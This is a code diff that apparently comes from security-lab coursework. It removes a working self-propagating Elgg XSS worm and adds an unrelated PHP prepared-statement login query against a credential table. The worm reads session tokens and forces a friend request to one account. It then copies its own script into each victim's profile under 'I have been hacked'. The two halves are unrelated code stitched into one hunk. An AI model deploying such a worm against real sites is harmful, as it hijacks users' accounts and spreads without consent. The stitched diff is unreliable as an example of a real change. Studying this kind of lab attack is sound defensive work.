@@ -1,33 +1,15 @@
-window.onload = function(){
-
-var userName = elgg.session.user.name;
-var guid = &quot;&amp;guid=&quot; + elgg.session.user.guid;
-var ts = &quot;&amp;__elgg_ts=&quot; + elgg.security.token.__elgg_ts;
-var token = &quot;&amp;__elgg_token=&quot; + elgg.security.token.__elgg_token;
-
-var samyGuid = 47;
-
-if(elgg.session.user.guid != samyGuid) {
-
-var sendurl = &quot;http://www.xsslabelgg.com/action/friends/add?friend=&quot; + samyGuid + ts + token;
-
-
-var Ajax = new XMLHttpRequest();
-Ajax.open(&quot;GET&quot;, sendurl, true);
-Ajax.send();
-
-var headerTag = &quot;&quot;;
-var jsCode = document.getElementById(&quot;worm&quot;).innerHTML;
-var tailTag = &quot;&lt;/&quot; + &quot;script&gt;&quot;;
-var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
-
-var content = &quot;name=&quot; + userName + &quot;&amp;description=I have been hacked&quot; + wormCode +
-&quot;&amp;accesslevel[description]=2&quot; + guid + ts + token;
-
-
-var Ajax2 = new XMLHttpRequest();
-Ajax2.open(&quot;POST&quot;,&quot;http://www.xsslabelgg.com/action/profile/edit&quot;, true);
-Ajax2.setRequestHeader(&quot;Content-Type&quot;,
-&quot;application/x-www-form-urlencoded&quot;);
-Ajax2.send(content);
-}
+$stmt = $conn->prepare("SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password
+      FROM credential
+      WHERE name=? and Password=?");
+      // 绑定参数
+      $stmt->bind_param("ss", $input_uname, $hashed_pwd);
+      // 执行查询
+      $stmt->execute();
+      // 获取结果
+      $result = $stmt->get_result();
+      
+      /* convert the select return result into array type */
+      $return_arr = array();
+      while($row = $result->fetch_assoc()){
+        array_push($return_arr,$row);
+      }
